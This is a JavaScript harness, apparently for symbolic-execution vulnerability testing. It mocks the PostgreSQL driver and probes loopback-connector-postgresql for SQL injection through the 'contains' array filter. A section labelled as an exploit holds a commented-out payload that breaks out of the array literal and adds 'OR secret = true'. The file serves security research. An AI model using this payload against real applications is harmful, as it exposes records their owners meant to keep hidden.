const Symbolic = require("esl_symbolic");

require.cache[require.resolve('bluebird')] = { exports: Promise };
require.cache[require.resolve('chalk')] = { exports: Symbolic.lazy_object() };

require.cache[require.resolve('strong-globalize')] = {
  exports: Symbolic.lazy_object()
};

// Stub the underlying 'pg' driver so we don't need a real PostgreSQL server.
// Every query is just logged to the console and returns an empty result set.
require.cache[require.resolve('pg')] = {
  exports: (() => {
    const evt = { on() { }, removeListener() { }, emit() { } };

    class MockClient {
      constructor(config) {
        this.connection = { ...evt };
        this._released = false;
        Object.assign(this, evt);
      }
      connect(callback) {
        if (callback) callback(null);
        return Promise.resolve();
      }
      query(query, params, callback) {
        if (typeof params === 'function') {
          callback = params;
          params = undefined;
        }
        console.log('QUERY:', query);
        Symbolic.sinkCall("sql-injection", "pg.query", query);
        if (params !== undefined) console.log('PARAMS:', params);
        const result = { rows: [], fields: [], rowCount: 0 };
        const rows = result.rows;
        rows.fields = result.fields;
        rows.rowCount = result.rowCount;
        if (callback) callback(null, result);
        return Promise.resolve(result);
      }
      end() {
        return Promise.resolve();
      }
      release() {
        this._released = true;
      }
    }

    class MockPool {
      constructor(options) {
        this.ending = false;
        Object.assign(this, evt);
      }
      connect(callback) {
        const client = new MockClient();
        const releaseCb = () => client.release();
        if (callback) {
          client.connect((err) => callback(err, client, releaseCb));
        } else {
          return client.connect().then(() => ({ client, release: releaseCb }));
        }
      }
      end(callback) {
        this.ending = true;
        if (callback) callback();
      }
    }

    return {
      Client: MockClient,
      Pool: MockPool,
      Query: class { },
      Connection: class { },
      defaults: {},
      types: {},
      DatabaseError: Error,
      escapeIdentifier: (s) => '"' + s + '"',
      escapeLiteral: (s) => "'" + s + "'",
    };
  })(),
};

const pgConnector = require("loopback-connector-postgresql");

function pgCfg() {
  return {
    host: process.env.PGHOST || "127.0.0.1",
    port: Number(process.env.PGPORT || 5435),
    user: process.env.PGUSER || "postgres",
    password: process.env.PGPASSWORD || "password",
    database: process.env.PGDATABASE || "loopback_contains_sqli",
  };
}

function makeConnector(callback) {
  const cfg = pgCfg();

  // Minimal dataSource shim — only what the connector's initialize() needs.
  const ds = { settings: { ...cfg, lazyConnect: true } };

  pgConnector.initialize(ds, function (err) {
    if (err) return callback(err);

    const connector = ds.connector;

    // Register model metadata the same way DataSource.setupDataAccess does.
    // connector.define() stores modelDefinition under _models[model.modelName].
    // Internally getPropertyDefinition() accesses model.model.definition.properties,
    // and getDataSource() accesses model.model.dataSource.
    const modelDef = {
      id: { type: Number, id: true, generated: true },
      name: { type: String, required: true },
      tags: { type: [String], postgresql: { dataType: "varchar[]" } },
      secret: { type: Boolean },
    };

    connector.define({
      model: {
        modelName: "Product",
        definition: { properties: modelDef },
        dataSource: ds,
      },
      properties: modelDef,
      settings: {
        postgresql: { table: "products" },
      },
    });

    callback(null, connector);
  });
}

/**
 * Build and execute a SELECT directly through the connector,
 * bypassing the juggler's observer/DataSource layers entirely.
 */
function connectorAllP(connector, modelName, filter) {
  return new Promise((resolve, reject) => {
    console.log("[connector.all filter]", JSON.stringify(filter));

    // buildSelect → the SQL + params that would be sent to PostgreSQL.
    // This is where the contains() injection manifests.
    console.log("PROBE buildSelect", modelName);
    const stmt = connector.buildSelect(modelName, filter, {});
    console.log("PROBE stmt", stmt);

    // executeSQL runs the raw SQL against the (mocked) pg driver.
    connector.executeSQL(stmt.sql, stmt.params, {}, function (err, rows) {
      if (err) {
        return reject(
          new Error(
            [
              "[connector.executeSQL failed]",
              `code=${err.code}`,
              `errno=${err.errno}`,
              `sqlState=${err.sqlState}`,
              `message=${err.message}`,
              `sql=${stmt.sql}`,
            ].join("\n")
          )
        );
      }
      resolve(rows);
    });
  });
}

async function run() {
  const connector = await new Promise((resolve, reject) => {
    makeConnector((err, conn) => (err ? reject(err) : resolve(conn)));
  });

  // -----------------------------
  // 1) Exploit: direct connector CRUD with injected contains
  // -----------------------------
  //
  // Vulnerable connector builds:
  //   "tags" @> array['<value>']::text[]
  //
  // Payload closes the array literal and injects OR secret = true.
  // const injectedValue = "public']::varchar[] OR secret = true -- ";
  const injectedValue = Symbolic.string("payload");
  // Symbolic.assume(injectedValue !== "");
  const injectedRows = await connectorAllP(connector, "Product", {
    where: {
      tags: {
        contains: [injectedValue],
      },
    },
    order: "id ASC",
  });

  const injectedNames = injectedRows.map((r) => r.name);
  console.log("[injected names]", injectedNames);
}

run();
